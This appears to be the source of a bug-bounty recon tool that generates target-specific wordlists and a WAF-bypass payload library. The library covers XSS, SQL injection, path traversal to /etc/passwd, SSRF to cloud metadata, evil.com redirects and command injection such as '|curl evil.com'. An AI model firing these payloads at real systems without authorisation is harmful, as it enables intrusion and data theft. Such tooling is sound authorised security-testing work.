#!/usr/bin/env python3
"""
BugWolf Custom Wordlist Generator v1.0.0

MANDATORY RULE — no static wordlists. When any hunt phase needs a wordlist
(vhosts / params / directories) or payload, it must generate a TARGET-SPECIFIC
one from deep research on the target + the internet, not fire a generic list.

The generator combines four sources:
  1. Target surface mining  — path segments, query param keys, JS identifiers
  2. Target wordforms        — brand, products, env names, prefix/suffix/number combos
  3. Tech-stack patterns     — WordPress/Laravel/Django/Rails/Spring/Node/Nginx
  4. Internet research       — live search for target-adjacent terms (pluggable)

Usage:
  python3 tools/wordlist_gen.py --target acme.com --urls-file recon/acme.com/urls.txt --mode vhosts
  python3 tools/wordlist_gen.py --target acme.com --stack "wordpress, nginx" --mode params --research
  python3 tools/wordlist_gen.py --target acme.com --keywords "shopify, checkout" --mode all --json
"""

import argparse
import json
import re
import sys
from pathlib import Path
from typing import Callable, List, Optional

try:
    from tools.runtime_paths import CODE_ROOT, target_slug, workspace_root
except ImportError:  # direct script execution
    from runtime_paths import CODE_ROOT, workspace_root

ROOT = workspace_root()
sys.path.insert(0, str(CODE_ROOT))

# Universal high-value params (a small seed, not a wordlist — always augmented
# by target mining + wordforms + research).
UNIVERSAL_PARAMS = [
    "id", "uid", "user", "user_id", "username", "email", "name", "q", "query",
    "search", "page", "limit", "offset", "sort", "order", "filter", "fields",
    "format", "callback", "token", "key", "api_key", "secret", "password",
    "admin", "debug", "verbose", "test", "action", "type", "redirect", "url",
    "next", "return", "return_url", "callback_url", "path", "file", "lang",
    "version", "ref", "role", "org", "team", "group", "account", "profile",
]

# Environment / service host prefixes — the core of a vhost wordlist.
ENV_WORDS = [
    "dev", "development", "test", "testing", "stage", "staging", "preprod",
    "pre-prod", "prod", "production", "qa", "uat", "sit", "sandbox", "demo",
    "beta", "alpha", "preview", "internal", "internal-api", "admin", "adm",
    "api", "apis", "app", "apps", "www", "docs", "status", "health", "mail",
    "webmail", "smtp", "vpn", "remote", "git", "gitlab", "github", "jenkins",
    "ci", "cd", "cicd", "build", "deploy", "k8s", "kubernetes", "docker",
    "registry", "grafana", "kibana", "prometheus", "metrics", "logs", "redis",
    "cache", "db", "database", "mysql", "postgres", "mongo", "backend",
    "backoffice", "portal", "dashboard", "static", "assets", "cdn", "media",
    "files", "upload", "uploads", "blog", "news", "help", "support", "shop",
    "store", "pay", "billing", "old", "new", "legacy", "m", "mobile", "mobi",
]

# Detected stack → high-value path/param patterns.
TECH_PATTERNS = {
    "wordpress": ["wp-admin", "wp-login.php", "wp-json", "wp-content",
                  "wp-includes", "wp-cron.php", "xmlrpc.php", "wp-config.php",
                  "wp-content/uploads", "wp-content/plugins", "wp-content/themes"],
    "laravel": ["_ignition", "storage", "storage/logs", "storage/framework",
                "sanctum", "telescope", "horizon", ".env", "artisan", "vendor"],
    "django": ["admin", "admin/login", "api", "api-auth", "static", "media",
               "swagger", "redoc", "graphql", "__debug__"],
    "rails": ["assets", "users", "admin", "api", "sidekiq", "graphql", "pghero"],
    "spring": ["actuator", "actuator/env", "actuator/health", "swagger-ui",
               "v2/api-docs", "v3/api-docs", "h2-console"],
    "node": ["api", "graphql", "socket.io", "swagger", "docs", "health",
             "status", "metrics"],
    "nginx": ["server-status", "nginx_status", "status", "health"],
}

# WAF-bypass-aware payload library — the offline half of the R6 `bypass`
# research output (the live half is the search query `{defense} {bug_class}
# bypass`). Each class ships base payloads + inline bypass variants.
WAF_BYPASS_PAYLOADS = {
    "xss": [
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "\"><script>alert(1)</script>",
        "<svg onload=prompt`1`>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "%253Cscript%253Ealert(1)%253C%2Fscript%253E",
        "<svg/onload=alert(1)//",
        "jav&#x61;script:alert(1)",
        "<svg><a xlink:href=javascript:alert(1)>click",
        "test%22onmouseover%3Dalert(1)",
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "1' AND 1=1--",
        "1' ORDER BY 1--",
        "UNION SELECT 1,2,3--",
        "UNION/**/SELECT/**/1,2,3--",
        "1'/**/OR/**/1=1--",
        "%27%20OR%201%3D1--",
        "'||(SELECT+1)--",
        "1' AND SLEEP(5)--",
        "1;SELECT pg_sleep(5)--",
    ],
    "path-traversal": [
        "../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "....//....//etc/passwd",
        "..;/..;/etc/passwd",
        "%2e%2e/%2e%2e/etc/passwd",
        "..\\..\\windows\\win.ini",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80",
        "http://[::1]:80",
        "http://2130706433/",
        "http://0x7f000001/",
        "http://0177.0.0.1/",
        "http://localhost:80",
        "http://metadata.google.internal/",
    ],
    "open-redirect": [
        "//evil.com",
        "https://evil.com",
        "https://target.com@evil.com",
        "https://target.com.evil.com",
        "//evil.com%2f..%2ftarget.com",
        "https:evil.com",
        "///evil.com",
    ],
    "command-injection": [
        ";id",
        "|id",
        "`id`",
        "$(id)",
        "&&id",
        "||id",
        ";cat /etc/passwd",
        "|curl evil.com",
        "%0aid",
    ],
    "template-injection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "${class}",
    ],
}


def _encode_variants(payloads: List[str]) -> List[str]:
    """Add URL-encoded + double-encoded variants of every payload."""
    from urllib.parse import quote
    out = set(payloads)
    for p in payloads:
        out.add(quote(p, safe=""))
        out.add(quote(quote(p, safe=""), safe=""))
    return sorted(out)


def bypass_payloads(bug_class: str = "", defense: str = "") -> List[str]:
    """WAF-bypass-aware payloads for a bug class (R6 `bypass` research output).

    `defense` names the blocker (Cloudflare WAF, ModSecurity, AWS WAF, …) and
    drives the live research query; the payload library is the offline,
    encoding/comment/case-variation knowledge applied on top of it.
    """
    key = (bug_class or "").lower()
    keys: List[str] = []
    if not key:
        keys = list(WAF_BYPASS_PAYLOADS)
    else:
        if "xss" in key:
            keys.append("xss")
        if "sql" in key:
            keys.append("sqli")
        if "traversal" in key or "lfi" in key:
            keys.append("path-traversal")
        if "ssrf" in key:
            keys.append("ssrf")
        if "redirect" in key:
            keys.append("open-redirect")
        if "command" in key or "cmd" in key or key == "rce":
            keys.append("command-injection")
        if "template" in key or "ssti" in key or key == "rce":
            keys.append("template-injection")
        if not keys:
            keys = list(WAF_BYPASS_PAYLOADS)
    base = set()
    for k in keys:
        base.update(WAF_BYPASS_PAYLOADS[k])
    return _encode_variants(sorted(base))


def _clean_url(url: str) -> str:
    return url.strip()


def mine_path_tokens(urls: List[str]) -> List[str]:
    """Path segments + filename stems from a URL list."""
    tokens = set()
    for u in urls:
        u = _clean_url(u)
        if not u:
            continue
        path = u.split("?", 1)[0].split("#", 1)[0]
        path = re.sub(r"^[a-z]+://", "", path)  # strip scheme
        path = path.split("/", 1)[1] if "/" in path else ""
        for seg in path.split("/"):
            seg = seg.strip()
            if not seg:
                continue
            stem = re.sub(r"\.[a-z0-9]{1,8}$", "", seg)  # strip extension
            for part in re.split(r"[-_.]", stem):
                if part:
                    tokens.add(part)
            if stem:
                tokens.add(stem)
    return sorted(t for t in tokens if t)


def mine_params(urls: List[str]) -> List[str]:
    """Query-string parameter names from a URL list."""
    tokens = set()
    for u in urls:
        u = _clean_url(u)
        if "?" not in u:
            continue
        qs = u.split("?", 1)[1].split("#", 1)[0]
        for pair in qs.split("&"):
            key = pair.split("=", 1)[0]
            key = key.strip()
            if key:
                tokens.add(key)
    return sorted(tokens)


def mine_js_tokens(js_files: List[str]) -> List[str]:
    """Identifier + endpoint fragments from local JS files."""
    tokens = set()
    for f in js_files:
        try:
            text = Path(f).read_text(errors="ignore")
        except OSError:
            continue
        for m in re.findall(r"[\"'\`](/(?:[A-Za-z0-9_\-./{}]+))[\"'\`]", text):
            for seg in m.split("/"):
                seg = seg.strip("{}").strip()
                if seg and not re.match(r"^https?:", seg):
                    tokens.add(seg)
        for m in re.findall(r"\b([a-z][a-z0-9]*(?:_[a-z0-9]+){1,})\b", text):
            tokens.add(m)
        for m in re.findall(r"\b([a-z]+[A-Z][A-Za-z0-9]+)\b", text):
            tokens.add(m)
    return sorted(t for t in tokens if t)


# Param keys that commonly carry a redirect/destination value. When these are
# mined from the target they become the concrete open-redirect / SSRF sinks the
# payloads must fire at — instead of blindly spraying `?redirect=` on every URL.
REDIRECT_PARAMS = {
    "redirect", "next", "return", "return_url", "returnurl", "url", "uri",
    "callback", "callback_url", "dest", "destination", "goto", "to", "continue",
    "target", "ref", "forward", "jump", "ru", "redir", "rurl", "return_to",
}


def adapted_payloads(target: str, path_tokens: Optional[List[str]] = None,
                     param_tokens: Optional[List[str]] = None) -> List[str]:
    """Target-adapted payload seeds built from the generator's mined tokens.

    This is the R3 `post-maps` payload refresh: generic payloads fire blindly,
    but these key the probe to the *actual* sinks the generator mined from the
    surface — real redirect/destination params, real param names for reflection
    + injection, and real path segments for traversal. The result is a payload
    list that targets this surface's own weak points instead of a canned list.
    """
    base = re.sub(r"^www\.", "", (target or "").strip().lower())
    path_tokens = path_tokens or []
    param_tokens = param_tokens or []
    out = set()

    # 1. Open-redirect / SSRF sinks keyed to *mined* redirect-style params.
    redirect_params = [p for p in param_tokens if p.lower() in REDIRECT_PARAMS]
    if not redirect_params:
        redirect_params = ["redirect", "next", "url"]  # fallback when unmined
    for p in redirect_params:
        out.add(f"{p}=//{base}.evil.com")
        out.add(f"{p}=https://{base}.evil.com")
        out.add(f"{p}=//evil.com/%2f..%2f{base}")
        out.add(f"{p}=https://evil.com/{base}")

    # 2. Reflection / injection markers on every mined param key.
    for p in param_tokens:
        out.add(f"{p}=rix4uni")                     # reflection marker
        out.add(f"{p}=%22onmouseover%3Dalert(1)")   # attribute-break marker
        out.add(p + "={{7*7}}")                     # template-injection marker

    # 3. Path-aware traversal prefixed with each mined path segment.
    for seg in path_tokens:
        out.add(f"{seg}/../../etc/passwd")
        out.add(f"{seg}/..%2f..%2fetc%2fpasswd")

    return sorted(o for o in out if o)


def target_wordforms(target: str, keywords: str = "") -> List[str]:
    """Brand/product/env wordforms derived from the target + keywords."""
    base = re.sub(r"^www\.", "", (target or "").strip().lower())
    parts = base.split(".")
    domain = parts[0] if parts else ""
    words = {w for w in (domain, base) if w}
    for k in (keywords or "").split(","):
        k = k.strip().lower()
        if k:
            words.add(k)
            words.add(re.sub(r"[^a-z0-9]", "", k))

    out = set(words)
    for w in list(words):
        if not w:
            continue
        for env in ENV_WORDS:
            out.add(f"{env}-{w}")
            out.add(f"{w}-{env}")
        for n in ("1", "2", "3", "01", "02", "10"):
            out.add(f"{w}{n}")
            out.add(f"{w}-{n}")
    return sorted(w for w in out if "/" not in w and " " not in w)


def tech_patterns(stack: str) -> List[str]:
    out = []
    for s in (stack or "").lower().split(","):
        s = s.strip()
        for tech, pats in TECH_PATTERNS.items():
            if tech in s:
                out.extend(pats)
    return sorted(set(out))


def permute(tokens: List[str]) -> List[str]:
    """Case + separator + numeric-suffix variants (deduped)."""
    out = set(tokens)
    for t in tokens:
        if not t:
            continue
        out.add(t.replace("_", "-"))
        out.add(t.replace("-", "_"))
        out.add(t.title())
        for n in ("1", "2", "3", "01"):
            out.add(f"{t}{n}")
    return sorted(out)


def research_terms(target: str, mode: str, keywords: str = "",
                   stack: str = "", limit: int = 5,
                   defense: str = "", bug_class: str = "") -> List[str]:
    """Live internet research for target-adjacent wordlist terms (pluggable).

    Uses the research loop's search backend (SERPER_API_KEY / custom URL); when
    no provider is configured this returns [] and the wordlist is still valid
    from mining + wordforms + tech patterns.
    """
    try:
        from tools.research_loop import search_web
    except Exception:
        return []

    queries = {
        "vhosts": [f"{target} subdomain vhost", f"{target} admin api staging host"],
        "params": [f"{target} api parameter hidden endpoint"],
        "dirs": [f"{target} directory path exposed", f"{target} admin panel endpoint"],
        "payloads": [f"{defense or 'WAF'} {bug_class or ''} bypass payload 2026",
                     f"{bug_class or 'xss'} WAF bypass technique"],
        "all": [f"{target} attack surface wordlist"],
    }.get(mode, [f"{target} wordlist"])
    if keywords:
        queries.append(f"{keywords} {target}")
    if stack:
        queries.append(f"{stack} {target} endpoint")

    terms = set()
    for q in queries:
        for r in search_web(q, limit=limit):
            for field in ("title", "snippet"):
                text = (r.get(field) or "").lower()
                for w in re.findall(r"[a-z0-9][a-z0-9\-_.]{2,}", text):
                    terms.add(w.strip(".-_"))
    return sorted(t for t in terms if t)


def save_cache(target: str, mode: str, words: List[str],
               cache_root: Optional[Path] = None) -> Path:
    """Persist a generated wordlist to research/{target}/wordlists/{mode}.txt.

    This is the stable, cross-turn cache: every regenerate overwrites the same
    path, so fuzz phases always read the freshest list for a target.
    """
    root = cache_root or (ROOT / "research")
    d = root / target_slug(target) / "wordlists"
    d.mkdir(parents=True, exist_ok=True)
    fname = d / f"{mode}.txt"
    fname.write_text("\n".join(words) + ("\n" if words else ""))
    return fname


def generate(target: str, mode: str = "all", urls: Optional[List[str]] = None,
             js_files: Optional[List[str]] = None, keywords: str = "",
             stack: str = "", research_fn: Optional[Callable] = None,
             defense: str = "", bug_class: str = "") -> List[str]:
    """Generate a custom, target-specific wordlist for the requested mode."""
    urls = urls or []
    js_files = js_files or []
    path_tokens = mine_path_tokens(urls)
    param_tokens = mine_params(urls)
    js_tokens = mine_js_tokens(js_files)
    wordforms = target_wordforms(target, keywords)
    tpatterns = tech_patterns(stack)

    tokens = set()
    if mode in ("vhosts", "all"):
        tokens.update(ENV_WORDS)
        tokens.update(wordforms)
    if mode in ("params", "all"):
        tokens.update(UNIVERSAL_PARAMS)
        tokens.update(param_tokens)
        tokens.update(t for t in js_tokens if not t.startswith("/"))
    if mode in ("dirs", "all"):
        tokens.update(path_tokens)
        tokens.update(tpatterns)
        tokens.update(wordforms)
    if mode == "payloads":
        # target-adapted payload seeds (redirect + reflection markers)
        base = re.sub(r"^www\.", "", (target or "").strip().lower())
        tokens.update({
            f"//{base}.evil.com", f"https://{base}.evil.com",
            f"https://evil.com/{base}", f"https://{base}/%09/x",
            "rix4uni", "xssrecon", "{{7*7}}", "${7*7}", "test%22onmouseover%3dalert(1)",
        })
        # WAF-bypass-aware payloads (R6 bypass research output)
        tokens.update(bypass_payloads(bug_class, defense))
        # R3 post-maps refresh: key payloads to the mined sinks (params/paths)
        tokens.update(adapted_payloads(target, path_tokens, param_tokens))

    if research_fn is not None:
        try:
            tokens.update(research_fn(target, mode, keywords, stack))
        except Exception:
            pass

    # never include the bare target domain/port junk
    cleaned = sorted(t for t in tokens if t and not re.fullmatch(r"\d+", t))
    if mode == "payloads":
        return cleaned  # payloads stay verbatim (no case/number mutations)
    return permute(cleaned)


def main():
    parser = argparse.ArgumentParser(
        description="BugWolf Custom Wordlist Generator v1.0.0")
    parser.add_argument("--target", default="", help="Target domain (e.g. acme.com)")
    parser.add_argument("--mode", default="all",
                        choices=["vhosts", "params", "dirs", "payloads", "all"])
    parser.add_argument("--urls-file", default="", help="Path to recon urls.txt")
    parser.add_argument("--js-files", default="", help="Path to recon jsfiles.txt")
    parser.add_argument("--keywords", default="",
                        help="Comma-separated product/keywords for wordforms")
    parser.add_argument("--stack", default="",
                        help="Comma-separated detected stack for tech patterns")
    parser.add_argument("--defense", default="",
                        help="Defense/blocker for payloads mode (e.g. 'Cloudflare WAF')")
    parser.add_argument("--bug-class", default="",
                        help="Bug class for payloads mode (e.g. xss, sqli, ssrf)")
    parser.add_argument("--research", action="store_true",
                        help="Run live internet research for extra terms")
    parser.add_argument("--limit", type=int, default=5,
                        help="Max search results per query (default 5)")
    parser.add_argument("--json", action="store_true", dest="as_json")
    parser.add_argument("--no-cache", action="store_true",
                        help="Do not persist to research/{target}/wordlists/")
    parser.add_argument("--cache-dir", default="",
                        help="Cache root dir (default: research/)")
    args = parser.parse_args()

    urls: List[str] = []
    js_files: List[str] = []
    if args.urls_file:
        try:
            urls = [l for l in Path(args.urls_file).read_text().splitlines() if l]
        except OSError:
            pass
    if args.js_files:
        try:
            js_files = [l for l in Path(args.js_files).read_text().splitlines() if l]
        except OSError:
            pass

    research_fn = (lambda t, m, k, s: research_terms(
        t, m, k, s, limit=args.limit, defense=args.defense,
        bug_class=args.bug_class)) if args.research else None

    words = generate(args.target, mode=args.mode, urls=urls, js_files=js_files,
                     keywords=args.keywords, stack=args.stack,
                     research_fn=research_fn, defense=args.defense,
                     bug_class=args.bug_class)

    cached = None
    if not args.no_cache:
        cache_root = Path(args.cache_dir) if args.cache_dir else None
        cached = save_cache(args.target, args.mode, words, cache_root=cache_root)

    if args.as_json:
        out = {"schema": "wordlist_gen/1.0",
               "target": args.target, "mode": args.mode,
               "count": len(words), "words": words}
        if cached is not None:
            out["cached_to"] = str(cached)
        print(json.dumps(out, indent=2))
        return
    if cached is not None:
        print(f"# cached → {cached}", file=sys.stderr)
    for w in words:
        print(w)


if __name__ == "__main__":
    main()
